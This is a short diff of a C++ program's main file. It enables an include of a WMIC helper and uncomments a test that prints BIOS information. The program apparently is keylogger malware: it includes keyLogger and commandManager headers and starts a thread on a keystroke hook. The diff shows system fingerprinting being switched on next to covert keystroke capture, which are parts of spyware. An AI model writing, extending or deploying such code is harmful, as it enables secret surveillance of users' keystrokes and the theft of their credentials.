@@ -3,7 +3,7 @@
 #include "commandManager.h"
 #include "keyLogger.h"
 #include "initialize.h"
-//#include "wmic.h"
+#include "wmic.h"
 
 
 #include <stdlib.h>
@@ -22,11 +22,11 @@ int main() {
         
         keyLogger logger;
 
-        /* wmic test
+        /* wmic test*/
         WMIC wmic;
         std::cout << wmic.getBIOSInfo() << std::endl;
         wmic.test();
-        */
+        /* */
 
 
         std::thread keyLog = std::thread(&keyLogger::startHook, logger);
